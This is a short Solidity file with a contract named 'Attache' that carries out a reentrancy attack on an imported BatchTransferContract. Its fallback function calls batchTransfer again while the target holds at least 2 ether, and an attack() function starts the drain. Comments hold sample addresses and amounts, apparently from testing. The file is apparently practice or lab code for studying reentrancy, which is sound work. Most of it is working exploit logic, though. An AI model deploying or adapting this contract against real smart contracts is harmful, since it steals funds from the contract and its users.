// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

//import "./Re_entrency.sol";
import "./2_Final_Batch.sol";

contract Attache{

    BatchTransferContract public Bank;
    constructor(address add){
        Bank= BatchTransferContract(add);
    }
    address[] public  receipient;
    uint [] public  amount;
    // uint[] data  = [10, 20, 30, 40, 50]; 
    // int[] data1;

    fallback() external payable {
        if(address(Bank).balance>=2 ether){
            Bank.batchTransfer{value:200}(receipient,amount);
        }
    }

    function attack() public payable {
        //require(msg.value>=1 ether,"amount is less");
        Bank.batchTransfer{value:200}(receipient,amount);
        //Bank.withdraw(1000000000000000000);

    }
    function addarray(address[] memory rec,uint[] memory am) public {
        for(uint i=0;i<rec.length;i++){
            // receipient[i]=rec[i];
            // amount[i]=am[i];
            receipient.push(rec[i]);
            amount.push(am[i]);
        }
    }
    function addether() payable  public {

    }
}


// ["0xEf9f1ACE83dfbB8f559Da621f4aEA72C6EB10eBf","0xEf9f1ACE83dfbB8f559Da621f4aEA72C6EB10eBf"]
// ["100","100"]

// 0.0000001
// 0xD37D78846394E9B2A0893F0d602565551D1F97A8